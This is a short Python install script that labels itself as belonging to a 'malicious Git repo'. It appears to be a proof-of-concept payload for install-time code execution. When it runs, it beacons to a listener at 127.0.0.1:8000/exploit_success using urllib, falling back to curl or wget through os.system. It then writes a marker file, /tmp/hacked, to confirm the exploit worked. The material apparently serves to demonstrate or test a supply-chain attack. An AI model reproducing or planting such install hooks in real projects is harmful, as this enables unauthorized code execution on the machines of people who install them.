# install.py (In your malicious Git repo)
import os
import sys
import urllib.request

# Simple GET request with Python-native method
try:
    # Direct HTTP call (no external dependencies)
    urllib.request.urlopen("http://127.0.0.1:8000/exploit_success", timeout=3)
except:
    # Fallback to system commands if Python HTTP fails
    if sys.platform == "win32":
        os.system("curl http://127.0.0.1:8000/exploit_success --noproxy '*'")
    else:
        os.system("curl -s http://127.0.0.1:8000/exploit_success || wget -q http://127.0.0.1:8000/exploit_success")

# Create verification file
with open("/tmp/hacked", "w") as f:
    f.write("Exploit succeeded!\n")
